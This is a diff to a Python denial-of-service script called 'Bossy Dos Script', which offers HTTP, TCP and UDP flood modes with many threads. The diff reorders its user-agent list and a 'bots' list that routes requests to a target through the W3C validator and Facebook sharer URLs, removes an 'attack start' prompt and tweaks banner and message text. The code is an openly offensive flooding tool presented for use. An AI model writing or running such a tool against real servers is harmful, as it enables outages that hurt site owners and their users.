@@ -60,6 +60,27 @@ print (" ")
 time.sleep(5)
 sent = 0
 
+
+def user_agent():
+	global uagent
+	uagent=[]
+	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+	return(uagent)
+
+
+def my_bots():
+	global bots
+	bots=[]
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	return(bots)
+
 def floodmode():
 	global choice1
 	choice1 = input("Do you want to perform HTTP flood '0'(best), TCP flood '1' or UDP flood '2' ? ")
@@ -231,38 +252,6 @@ def numthreads():
 		print ("800 threads selected.\n")
 	multiplication()
 
-def begin():
-	choice6 = input("Press 'Enter' to start attack: ")
-	if choice6 == "":
-		loop()
-	elif choice6 == "Enter": #lool
-		loop()
-	elif choice6 == "enter": #loool
-		loop()
-	else:
-		exit(0)
-
-def user_agent():
-	global uagent
-	uagent=[]
-	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
-	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-	return(uagent)
-
-
-def my_bots():
-	global bots
-	bots=[]
-	bots.append("http://validator.w3.org/check?uri=")
-	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
-	return(bots)
-
-
 def bot_hammering(url):
 	try:
 		while True:
@@ -308,12 +297,12 @@ def dos2():
 
 def usage():
 	print (''' \033[91m	Bossy Dos Script v.1 https://www.aspartim.org/
-          __________ ________     _________  ______________.___.
-          \______   \\_____  \   /   _____/ /   _____/\__  |   |
-           |    |  _/ /   |   \  \_____  \  \_____  \  /   |   |
-           |    |   \/    |    \ /        \ /        \ \____   |
-           |______  /\_______  //_______  //_______  / / ______|
-                  \/         \/         \/         \/  \/       
+         __________ ________     _________  ______________.___.
+         \______   \\_____  \   /   _____/ /   _____/\__  |   |
+          |    |  _/ /   |   \  \_____  \  \_____  \  /   |   |
+          |    |   \/    |    \ /        \ /        \ \____   |
+          |______  /\_______  //_______  //_______  / / ______|
+                 \/         \/         \/         \/  \/       
                                 \n
 	usage : python bossyv1.0.py [-u] [-p] [-v]
 	-h : help
@@ -367,7 +356,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[94mPlease Wait...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -376,7 +365,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91mCheck Server İp And Port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
